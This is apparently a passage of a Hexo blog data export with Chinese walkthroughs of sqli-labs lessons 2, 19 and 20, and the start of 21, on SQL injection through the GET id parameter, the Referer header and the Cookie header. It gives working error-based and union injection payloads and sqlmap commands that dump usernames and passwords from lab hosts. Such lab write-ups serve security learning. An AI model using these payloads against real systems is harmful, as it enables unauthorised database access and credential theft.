src=\"/img/sql/Lesson-19/4.png\" alt=\"4\"></p>\n<p>payload:</p>\n<p><code>http://10.60.250.66/sql/Less-19/&#39; and extractvalue(null,concat(0x7e,database(),0x7e)) and &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-19/5.png\" alt=\"5\"></p>\n<p>详细过程看Lesson-18</p>\n<a href=\"/2018/09/28/sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入/\" title=\"点击查看\">点击查看</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--data:指定请求数据</span><br><span class=\"line\"></span><br><span class=\"line\">--<span class=\"function\"><span class=\"keyword\">method</span>:</span>指定请求方式</span><br><span class=\"line\"></span><br><span class=\"line\">--dbms:指定后端数据库</span><br><span class=\"line\"></span><br><span class=\"line\">--thread:指定并发线程</span><br><span class=\"line\"></span><br><span class=\"line\">--referer:指定referer字段</span><br><span class=\"line\"></span><br><span class=\"line\">--level <span class=\"number\">3</span>:加入检测User-Agent和Referer</span><br><span class=\"line\"></span><br><span class=\"line\">--technique E:检测报错注入</span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://10.60.250.66/sql/Less-19/&quot; --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --method POST --dbms mysql --threads 10 --referer &quot;http://10.60.250.66/sql/Less-19/&#39; and &#39;1&#39;=&#39;1&quot; --level 3 --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-19/6.png\" alt=\"6\"></p>\n<p><img src=\"/img/sql/Lesson-19/7.png\" alt=\"7\"></p>\n<p><code>sqlmap -u &quot;http://10.60.250.66/sql/Less-19/&quot; --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --method POST --dbms mysql --threads 10 --referer &quot;http://10.60.250.66/sql/Less-19/&#39; and &#39;1&#39;=&#39;1&quot; --level 3 --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-19/8.png\" alt=\"8\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-19-POST基于错误的Referer字段数据头注入\"><a href=\"#sqli-labs-lession-19-POST基于错误的Referer字段数据头注入\" class=\"headerlink\" title=\"sqli-labs lession 19 POST基于错误的Referer字段数据头注入\"></a>sqli-labs lession 19 POST基于错误的Referer字段数据头注入</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-19/1.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>根据题目提示直接在Referer字段尝试。</p>\n<p><img src=\"/img/sql/Lesson-19/2.png\" alt=\"2\"></p>\n<p>单引号引起报错</p>\n<p><img src=\"/img/sql/Lesson-19/3.png\" alt=\"3\"></p>\n<p>抑制下一个单引号</p>\n<p><img src=\"/img/sql/Lesson-19/4.png\" alt=\"4\"></p>\n<p>payload:</p>\n<p><code>http://10.60.250.66/sql/Less-19/&#39; and extractvalue(null,concat(0x7e,database(),0x7e)) and &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-19/5.png\" alt=\"5\"></p>\n<p>详细过程看Lesson-18</p>\n<a href=\"/2018/09/28/sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入/\" title=\"点击查看\">点击查看</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--data:指定请求数据</span><br><span class=\"line\"></span><br><span class=\"line\">--<span class=\"function\"><span class=\"keyword\">method</span>:</span>指定请求方式</span><br><span class=\"line\"></span><br><span class=\"line\">--dbms:指定后端数据库</span><br><span class=\"line\"></span><br><span class=\"line\">--thread:指定并发线程</span><br><span class=\"line\"></span><br><span class=\"line\">--referer:指定referer字段</span><br><span class=\"line\"></span><br><span class=\"line\">--level <span class=\"number\">3</span>:加入检测User-Agent和Referer</span><br><span class=\"line\"></span><br><span class=\"line\">--technique E:检测报错注入</span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://10.60.250.66/sql/Less-19/&quot; --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --method POST --dbms mysql --threads 10 --referer &quot;http://10.60.250.66/sql/Less-19/&#39; and &#39;1&#39;=&#39;1&quot; --level 3 --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-19/6.png\" alt=\"6\"></p>\n<p><img src=\"/img/sql/Lesson-19/7.png\" alt=\"7\"></p>\n<p><code>sqlmap -u &quot;http://10.60.250.66/sql/Less-19/&quot; --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --method POST --dbms mysql --threads 10 --referer &quot;http://10.60.250.66/sql/Less-19/&#39; and &#39;1&#39;=&#39;1&quot; --level 3 --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-19/8.png\" alt=\"8\"></p>\n"},{"title":"sqli-labs lession 2 (基于错误的GET整型注入)","date":"2018-09-18T12:23:34.000Z","_content":"# sqli-labs lession 2 (基于错误的GET整型注入) #\n---\n## 登录界面 ##\n\n![1](/img/sql/lesson2/1.png)\n\n## 手注 ##\n\n### 判断注入类型 ###\n\n根据题目提示尝试一下整型注入\n\n`http://10.60.250.214/Less-2/?id=1%20and%201=2`\n\n![2](/img/sql/lesson2/2.png)\n\n果然存在注入点！！\n\n### 获取数据值 ###\n\n这里只是$id的获取方式变化了,查看源码就可以发现SQL变成如下形式了,其他都一样。\n\n![3](/img/sql/lesson2/3.png)\n\n可以构造如下:\n\n`http://10.60.250.214/Less-2/?id=1%20order%20by%204%23`\n\n![4](/img/sql/lesson2/4.png)\n\n`http://10.60.250.214/Less-2/?id=1%20order%20by%203%23`\n\n![5](/img/sql/lesson2/5.png)\n\n这里可以判断出字段数目\n\n`http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,3%23`\n\n![6](/img/sql/lesson2/6.png)\n\n这些步骤和Lesson-1一致,可以查看这里。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}\n\n直接上图吧。\n\n`http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,group_concat(username,%27:%27,password)%20from%20users%23`\n\n![7](/img/sql/lesson2/7.png)\n\n## SQLMAP ##\n\n与Lesson-1基本一致,具体流程可以查看这里。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}\n\n这里只填写最后一步。\n\n`sqlmap -u \"http://10.60.250.214/Less-2/?id=1\" --batch -D security -T users --columns --dump`\n\n![8](/img/sql/lesson2/8.png)\n\n![9](/img/sql/lesson2/9.png)","source":"_posts/sqli-labs-lession-2-基于错误的GET整型注入.md","raw":"---\ntitle: sqli-labs lession 2 (基于错误的GET整型注入)\ndate: 2018-09-18 20:23:34\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs lession 2 (基于错误的GET整型注入) #\n---\n## 登录界面 ##\n\n![1](/img/sql/lesson2/1.png)\n\n## 手注 ##\n\n### 判断注入类型 ###\n\n根据题目提示尝试一下整型注入\n\n`http://10.60.250.214/Less-2/?id=1%20and%201=2`\n\n![2](/img/sql/lesson2/2.png)\n\n果然存在注入点！！\n\n### 获取数据值 ###\n\n这里只是$id的获取方式变化了,查看源码就可以发现SQL变成如下形式了,其他都一样。\n\n![3](/img/sql/lesson2/3.png)\n\n可以构造如下:\n\n`http://10.60.250.214/Less-2/?id=1%20order%20by%204%23`\n\n![4](/img/sql/lesson2/4.png)\n\n`http://10.60.250.214/Less-2/?id=1%20order%20by%203%23`\n\n![5](/img/sql/lesson2/5.png)\n\n这里可以判断出字段数目\n\n`http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,3%23`\n\n![6](/img/sql/lesson2/6.png)\n\n这些步骤和Lesson-1一致,可以查看这里。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}\n\n直接上图吧。\n\n`http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,group_concat(username,%27:%27,password)%20from%20users%23`\n\n![7](/img/sql/lesson2/7.png)\n\n## SQLMAP ##\n\n与Lesson-1基本一致,具体流程可以查看这里。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1 %}\n\n这里只填写最后一步。\n\n`sqlmap -u \"http://10.60.250.214/Less-2/?id=1\" --batch -D security -T users --columns --dump`\n\n![8](/img/sql/lesson2/8.png)\n\n![9](/img/sql/lesson2/9.png)","slug":"sqli-labs-lession-2-基于错误的GET整型注入","published":1,"updated":"2019-06-19T17:23:13.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istd1002j4dsbqmq9q7tx","content":"<h1 id=\"sqli-labs-lession-2-基于错误的GET整型注入\"><a href=\"#sqli-labs-lession-2-基于错误的GET整型注入\" class=\"headerlink\" title=\"sqli-labs lession 2 (基于错误的GET整型注入)\"></a>sqli-labs lession 2 (基于错误的GET整型注入)</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/lesson2/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><p>根据题目提示尝试一下整型注入</p>\n<p><code>http://10.60.250.214/Less-2/?id=1%20and%201=2</code></p>\n<p><img src=\"/img/sql/lesson2/2.png\" alt=\"2\"></p>\n<p>果然存在注入点！！</p>\n<h3 id=\"获取数据值\"><a href=\"#获取数据值\" class=\"headerlink\" title=\"获取数据值\"></a>获取数据值</h3><p>这里只是$id的获取方式变化了,查看源码就可以发现SQL变成如下形式了,其他都一样。</p>\n<p><img src=\"/img/sql/lesson2/3.png\" alt=\"3\"></p>\n<p>可以构造如下:</p>\n<p><code>http://10.60.250.214/Less-2/?id=1%20order%20by%204%23</code></p>\n<p><img src=\"/img/sql/lesson2/4.png\" alt=\"4\"></p>\n<p><code>http://10.60.250.214/Less-2/?id=1%20order%20by%203%23</code></p>\n<p><img src=\"/img/sql/lesson2/5.png\" alt=\"5\"></p>\n<p>这里可以判断出字段数目</p>\n<p><code>http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,3%23</code></p>\n<p><img src=\"/img/sql/lesson2/6.png\" alt=\"6\"></p>\n<p>这些步骤和Lesson-1一致,可以查看这里。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>\n\n<p>直接上图吧。</p>\n<p><code>http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,group_concat(username,%27:%27,password)%20from%20users%23</code></p>\n<p><img src=\"/img/sql/lesson2/7.png\" alt=\"7\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>与Lesson-1基本一致,具体流程可以查看这里。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>\n\n<p>这里只填写最后一步。</p>\n<p><code>sqlmap -u &quot;http://10.60.250.214/Less-2/?id=1&quot; --batch -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/lesson2/8.png\" alt=\"8\"></p>\n<p><img src=\"/img/sql/lesson2/9.png\" alt=\"9\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-2-基于错误的GET整型注入\"><a href=\"#sqli-labs-lession-2-基于错误的GET整型注入\" class=\"headerlink\" title=\"sqli-labs lession 2 (基于错误的GET整型注入)\"></a>sqli-labs lession 2 (基于错误的GET整型注入)</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/lesson2/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><p>根据题目提示尝试一下整型注入</p>\n<p><code>http://10.60.250.214/Less-2/?id=1%20and%201=2</code></p>\n<p><img src=\"/img/sql/lesson2/2.png\" alt=\"2\"></p>\n<p>果然存在注入点！！</p>\n<h3 id=\"获取数据值\"><a href=\"#获取数据值\" class=\"headerlink\" title=\"获取数据值\"></a>获取数据值</h3><p>这里只是$id的获取方式变化了,查看源码就可以发现SQL变成如下形式了,其他都一样。</p>\n<p><img src=\"/img/sql/lesson2/3.png\" alt=\"3\"></p>\n<p>可以构造如下:</p>\n<p><code>http://10.60.250.214/Less-2/?id=1%20order%20by%204%23</code></p>\n<p><img src=\"/img/sql/lesson2/4.png\" alt=\"4\"></p>\n<p><code>http://10.60.250.214/Less-2/?id=1%20order%20by%203%23</code></p>\n<p><img src=\"/img/sql/lesson2/5.png\" alt=\"5\"></p>\n<p>这里可以判断出字段数目</p>\n<p><code>http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,3%23</code></p>\n<p><img src=\"/img/sql/lesson2/6.png\" alt=\"6\"></p>\n<p>这些步骤和Lesson-1一致,可以查看这里。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>\n\n<p>直接上图吧。</p>\n<p><code>http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,group_concat(username,%27:%27,password)%20from%20users%23</code></p>\n<p><img src=\"/img/sql/lesson2/7.png\" alt=\"7\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>与Lesson-1基本一致,具体流程可以查看这里。</p>\n<a href=\"/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/\" title=\"点击查看Lesson-1\">点击查看Lesson-1</a>\n\n<p>这里只填写最后一步。</p>\n<p><code>sqlmap -u &quot;http://10.60.250.214/Less-2/?id=1&quot; --batch -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/lesson2/8.png\" alt=\"8\"></p>\n<p><img src=\"/img/sql/lesson2/9.png\" alt=\"9\"></p>\n"},{"title":"sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入","date":"2018-09-29T12:34:34.000Z","_content":"# sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入 #\n\n## 登录界面 ##\n\n![1](\\img\\sql\\Lesson-20\\1.png)\n\n## 分析 ##\n\n不出所料账号密码被过滤了。\n\n![2](\\img\\sql\\Lesson-20\\2.png)\n\n用admin,admin登录成功,页面返回信息。\n\n![3](\\img\\sql\\Lesson-20\\3.png)\n\n这次页面拿了一堆信息。\n\n\n从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用Burpsuite做了。\n\n![4](\\img\\sql\\Lesson-20\\4.png)\n\n关闭phpstudy的magic_quotes_gpc配置,否则cookie数据中的特殊符号会被转义导致实验失败。\n\n![5](\\img\\sql\\Lesson-20\\5.png)\n\n## 注入 ##\n\n首先以正确的用户账号登录\n\n![6](\\img\\sql\\Lesson-20\\6.png)\n\n然后开启firefox代理,用Burpsuite拦截包。刷新页面。\n\n![7](\\img\\sql\\Lesson-20\\7.png)\n\n截取到服务器请求获取cookie的包,发送到Repeater。\n\n![8](\\img\\sql\\Lesson-20\\8.png)\n\n修改`Cookie: uname=admin`为`Cookie: uname=admin'`,点击GO发送,查看归还界面。\n\n![9](\\img\\sql\\Lesson-20\\9.png)\n\n有报错信息后根据报错信息构造闭合,payload也呼之欲出。\n\n![10](\\img\\sql\\Lesson-20\\10.png)\n\n`Cookie: uname=admin' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#`\n\n![11](\\img\\sql\\Lesson-20\\11.png)\n\n## SQLMAP ##\n\n用Burpsuite抓取刷新页面的包,能够获得cookie信息。保存到文件。\n\n![12](\\img\\sql\\Lesson-20\\12.png)\n\n-r 指定HTTP请求报文\n\n```\n--level 2:加入检测cookie\n\n--dbms mysql:指定后端数据库为mysql\n\n--technique E:指定测试方式为报错注入\n\n--thread 10:指定并发线程\n```\n\n`sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 `\n\n![13](\\img\\sql\\Lesson-20\\13.png)\n\n`sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 -D security -T users --columns --dump`\n\n![14](\\img\\sql\\Lesson-20\\14.png)","source":"_posts/sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入.md","raw":"---\ntitle: sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入\ndate: 2018-09-29 20:34:34\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入 #\n\n## 登录界面 ##\n\n![1](\\img\\sql\\Lesson-20\\1.png)\n\n## 分析 ##\n\n不出所料账号密码被过滤了。\n\n![2](\\img\\sql\\Lesson-20\\2.png)\n\n用admin,admin登录成功,页面返回信息。\n\n![3](\\img\\sql\\Lesson-20\\3.png)\n\n这次页面拿了一堆信息。\n\n\n从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用Burpsuite做了。\n\n![4](\\img\\sql\\Lesson-20\\4.png)\n\n关闭phpstudy的magic_quotes_gpc配置,否则cookie数据中的特殊符号会被转义导致实验失败。\n\n![5](\\img\\sql\\Lesson-20\\5.png)\n\n## 注入 ##\n\n首先以正确的用户账号登录\n\n![6](\\img\\sql\\Lesson-20\\6.png)\n\n然后开启firefox代理,用Burpsuite拦截包。刷新页面。\n\n![7](\\img\\sql\\Lesson-20\\7.png)\n\n截取到服务器请求获取cookie的包,发送到Repeater。\n\n![8](\\img\\sql\\Lesson-20\\8.png)\n\n修改`Cookie: uname=admin`为`Cookie: uname=admin'`,点击GO发送,查看归还界面。\n\n![9](\\img\\sql\\Lesson-20\\9.png)\n\n有报错信息后根据报错信息构造闭合,payload也呼之欲出。\n\n![10](\\img\\sql\\Lesson-20\\10.png)\n\n`Cookie: uname=admin' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#`\n\n![11](\\img\\sql\\Lesson-20\\11.png)\n\n## SQLMAP ##\n\n用Burpsuite抓取刷新页面的包,能够获得cookie信息。保存到文件。\n\n![12](\\img\\sql\\Lesson-20\\12.png)\n\n-r 指定HTTP请求报文\n\n```\n--level 2:加入检测cookie\n\n--dbms mysql:指定后端数据库为mysql\n\n--technique E:指定测试方式为报错注入\n\n--thread 10:指定并发线程\n```\n\n`sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 `\n\n![13](\\img\\sql\\Lesson-20\\13.png)\n\n`sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 -D security -T users --columns --dump`\n\n![14](\\img\\sql\\Lesson-20\\14.png)","slug":"sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入","published":1,"updated":"2019-06-19T17:23:13.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istd3002m4dsbbgu2f0j1","content":"<h1 id=\"sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入\"><a href=\"#sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入\" class=\"headerlink\" title=\"sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入\"></a>sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"%5Cimg%5Csql%5CLesson-20%5C1.png\" alt=\"1\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>不出所料账号密码被过滤了。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C2.png\" alt=\"2\"></p>\n<p>用admin,admin登录成功,页面返回信息。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C3.png\" alt=\"3\"></p>\n<p>这次页面拿了一堆信息。</p>\n<p>从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用Burpsuite做了。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C4.png\" alt=\"4\"></p>\n<p>关闭phpstudy的magic_quotes_gpc配置,否则cookie数据中的特殊符号会被转义导致实验失败。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C5.png\" alt=\"5\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>首先以正确的用户账号登录</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C6.png\" alt=\"6\"></p>\n<p>然后开启firefox代理,用Burpsuite拦截包。刷新页面。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C7.png\" alt=\"7\"></p>\n<p>截取到服务器请求获取cookie的包,发送到Repeater。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C8.png\" alt=\"8\"></p>\n<p>修改<code>Cookie: uname=admin</code>为<code>Cookie: uname=admin&#39;</code>,点击GO发送,查看归还界面。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C9.png\" alt=\"9\"></p>\n<p>有报错信息后根据报错信息构造闭合,payload也呼之欲出。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C10.png\" alt=\"10\"></p>\n<p><code>Cookie: uname=admin&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;),0x7e))#</code></p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C11.png\" alt=\"11\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>用Burpsuite抓取刷新页面的包,能够获得cookie信息。保存到文件。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C12.png\" alt=\"12\"></p>\n<p>-r 指定HTTP请求报文</p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--level 2:加入检测cookie</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--dbms mysql:指定后端数据库为mysql</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--technique E:指定测试方式为报错注入</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--thread 10:指定并发线程</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10</code></p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C13.png\" alt=\"13\"></p>\n<p><code>sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C14.png\" alt=\"14\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入\"><a href=\"#sqli-labs-lession-20-POST基于错误的Cookie-Uagent字段数据头注入\" class=\"headerlink\" title=\"sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入\"></a>sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"%5Cimg%5Csql%5CLesson-20%5C1.png\" alt=\"1\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>不出所料账号密码被过滤了。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C2.png\" alt=\"2\"></p>\n<p>用admin,admin登录成功,页面返回信息。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C3.png\" alt=\"3\"></p>\n<p>这次页面拿了一堆信息。</p>\n<p>从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用Burpsuite做了。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C4.png\" alt=\"4\"></p>\n<p>关闭phpstudy的magic_quotes_gpc配置,否则cookie数据中的特殊符号会被转义导致实验失败。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C5.png\" alt=\"5\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>首先以正确的用户账号登录</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C6.png\" alt=\"6\"></p>\n<p>然后开启firefox代理,用Burpsuite拦截包。刷新页面。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C7.png\" alt=\"7\"></p>\n<p>截取到服务器请求获取cookie的包,发送到Repeater。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C8.png\" alt=\"8\"></p>\n<p>修改<code>Cookie: uname=admin</code>为<code>Cookie: uname=admin&#39;</code>,点击GO发送,查看归还界面。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C9.png\" alt=\"9\"></p>\n<p>有报错信息后根据报错信息构造闭合,payload也呼之欲出。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C10.png\" alt=\"10\"></p>\n<p><code>Cookie: uname=admin&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39;),0x7e))#</code></p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C11.png\" alt=\"11\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>用Burpsuite抓取刷新页面的包,能够获得cookie信息。保存到文件。</p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C12.png\" alt=\"12\"></p>\n<p>-r 指定HTTP请求报文</p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--level 2:加入检测cookie</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--dbms mysql:指定后端数据库为mysql</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--technique E:指定测试方式为报错注入</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--thread 10:指定并发线程</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10</code></p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C13.png\" alt=\"13\"></p>\n<p><code>sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"%5Cimg%5Csql%5CLesson-20%5C14.png\" alt=\"14\"></p>\n"},{"title":"sqli-labs-lession 21 base64编码单引号和括号的Cookie注入","date":"2018-10-02T11:58:34.000Z","_content":"\n# sqli-labs-lession 21 base64编码单引号和括号的Cookie注入\n\n---\n\n## 登录界面\n\n![1](/img/sql/Lesson-21/001.png)\n\n## 